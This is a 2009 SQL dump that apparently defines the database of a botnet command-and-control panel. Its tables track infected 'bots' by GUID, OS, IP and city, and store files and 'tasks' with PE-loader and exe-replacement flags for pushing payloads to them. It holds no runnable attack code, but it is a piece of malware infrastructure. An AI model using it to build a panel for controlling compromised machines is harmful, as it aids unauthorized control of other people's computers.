-- phpMyAdmin SQL Dump
-- version 2.9.1.1-Debian-10
-- http://www.phpmyadmin.net
-- 
-- Host: localhost
-- Generation Time: Sep 28, 2009 at 11:31 PM
-- Server version: 5.0.32
-- PHP Version: 5.2.0-8+etch13
-- 
-- Database: `btcc1`
-- 

-- --------------------------------------------------------

-- 
-- Table structure for table `bots_t`
-- 

CREATE TABLE `bots_t` (
  `id_bot` bigint(20) unsigned NOT NULL auto_increment,
  `guid_bot` char(50) character set utf8 collate utf8_unicode_ci NOT NULL default '',
  `ver_bot` char(25) character set utf8 collate utf8_unicode_ci NOT NULL default '',
  `status_bot` char(50) character set utf8 collate utf8_unicode_ci NOT NULL default '',
  `blocked` tinyint(4) NOT NULL default '0',
  `fk_city_bot` bigint(20) unsigned NOT NULL default '0',
  `date_last_run_bot` datetime default '1970-01-01 00:00:00',
  `date_last_online_bot` datetime default '1970-01-01 00:00:00',
  `os_version_bot` varchar(25) default NULL,
  `ie_version_bot` varchar(25) default NULL,
  `user_type_bot` varchar(25) default NULL,
  `date_install_bot` timestamp NOT NULL default CURRENT_TIMESTAMP,
  `date_last_geoip_check_bot` MEDIUMINT UNSIGNED NOT NULL DEFAULT 734554,
  `fk_screen_bot` SMALLINT UNSIGNED NOT NULL,
  `wake_time_bot` SMALLINT UNSIGNED DEFAULT 30,  
  PRIMARY KEY  (`id_bot`),
  UNIQUE KEY `guid_bot` (`guid_bot`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 COMMENT='table of bots';

-- --------------------------------------------------------

-- 
-- Table structure for table `city_t`
-- 

CREATE TABLE `city_t` (
  `id_city` bigint(20) unsigned NOT NULL auto_increment,
  `name_city` varchar(50) character set utf8 collate utf8_unicode_ci NOT NULL default '',
  `state` varchar(50) default NULL,
  `fk_country_city` bigint(20) unsigned NOT NULL default '0',
  PRIMARY KEY  (`id_city`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=4663 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `country_t`
-- 

CREATE TABLE `country_t` (
  `id_country` bigint(20) unsigned NOT NULL auto_increment,
  `name_country` char(50) character set utf8 collate utf8_unicode_ci NOT NULL default '',
  PRIMARY KEY  (`id_country`),
  UNIQUE KEY `name_country` (`name_country`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 COMMENT='table of countres' AUTO_INCREMENT=275 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `ip_t`
-- 

CREATE TABLE `ip_t` (
  `id` bigint(20) NOT NULL auto_increment,
  `fk_bot` bigint(20) NOT NULL,
  `ip` varchar(20) NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `fk_bot` (`fk_bot`,`ip`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1223 ;


-- --------------------------------------------------------

-- 
-- Update for v1.0.4 admin panel
-- 

CREATE TABLE `os_t` (
`name` VARCHAR( 30 ) NOT NULL ,
`version` VARCHAR( 5 ) NOT NULL ,
INDEX ( `version` ) 
);
INSERT INTO `os_t` VALUES ('Windows 2000', '5.0');
INSERT INTO `os_t` VALUES ('Windows XP', '5.1');
INSERT INTO `os_t` VALUES ('Windows Server 2003', '5.2');
INSERT INTO `os_t` VALUES ('Windows Vista', '6.0');
INSERT INTO `os_t` VALUES ('Windows 7', '6.1');

--
-- Update for v1.0.5 admin panel
--

CREATE TABLE IF NOT EXISTS `plugins` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `fk_bot` int(10) unsigned NOT NULL,
  `plugin` varchar(40) NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `fk_bot` (`fk_bot`,`plugin`)
) ENGINE=MEMORY  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;


CREATE TABLE IF NOT EXISTS `users_t` (
  `uId` tinyint(3) unsigned NOT NULL auto_increment,
  `uLogin` varchar(20) NOT NULL,
  `uPswd` char(32) NOT NULL,
  `uLastTime` datetime NOT NULL,
  `uIp` varchar(15) NOT NULL,
  PRIMARY KEY  (`uId`),
  UNIQUE KEY `uLogin` (`uLogin`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

CREATE TABLE `configs_t` (
	`cId` smallint(5) unsigned NOT NULL auto_increment,
	`cKey` varchar(100) NOT NULL,
	`cValue` varchar(255) NOT NULL,
	PRIMARY KEY  (`cId`),
	UNIQUE KEY `cKey` (`cKey`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

CREATE TABLE geo_loc (
  loc_id MEDIUMINT UNSIGNED NOT NULL,
  start INT UNSIGNED NOT NULL,
  end INT UNSIGNED NOT NULL
);

CREATE TABLE geo_city (
  locId MEDIUMINT UNSIGNED NOT NULL PRIMARY KEY,
  tc CHAR(2) NOT NULL,
  tr CHAR(2),
  tn CHAR(46)
 );

CREATE TABLE geo_country (
  cc CHAR(2) NOT NULL,
  cn CHAR(38) NOT NULL,
  unique key(cc, cn)
);

CREATE TABLE files_t
(
	fId INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
	fName VARCHAR(255) NOT NULL UNIQUE KEY,
	fCont MEDIUMBLOB NOT NULL,
	fMd5 varchar(32) not null default '0',
	fType ENUM('b', 'c', 'e') NOT NULL DEFAULT 'e'
);

CREATE TABLE logs_t
(
  logId INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  logType CHAR(1) NOT NULL DEFAULT 'e',
  logData VARCHAR(1000) NOT NULL
);

CREATE TABLE screens_t
(
  scrId SMALLINT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  scrHeight SMALLINT UNSIGNED NOT NULL,
  scrWidth SMALLINT UNSIGNED NOT NULL,
  scrDepth TINYINT UNSIGNED NOT NULL,
  UNIQUE KEY(scrHeight, scrWidth, scrDepth)
);

CREATE TABLE loads_t
(
  upId BIGINT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  fk_bot_id BIGINT UNSIGNED NOT NULL,
  upStatus TINYINT UNSIGNED NOT NULL,
  fk_task_id SMALLINT UNSIGNED NOT NULL,
  upStartTime datetime DEFAULT '0000-00-00 00:00:00',
  UNIQUE KEY(fk_bot_id, fk_task_id)
);

CREATE TABLE tasks_t
(
  tskId SMALLINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  tskDate datetime NOT NULL,
  tskComment varchar(255) NOT NULL DEFAULT '',
  fk_file_id INT UNSIGNED NOT NULL,
  tskPeLoader TINYINT NOT NULL DEFAULT 0,
  tskReplExe TINYINT NOT NULL DEFAULT 0,
  isUnlimit tinyint(1) NOT NULL,
  tskState enum('0','1') NOT NULL DEFAULT 1
);

CREATE TABLE `loads_rep_t` 
(
  `id_rep` bigint(20) NOT NULL auto_increment,
  `data_rep` varchar(1000) default NULL,
  `date_rep` datetime default '1970-01-01 00:00:00',
  `fk_load_id` bigint(20) unsigned default NULL,
  PRIMARY KEY  (`id_rep`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=3876 ;
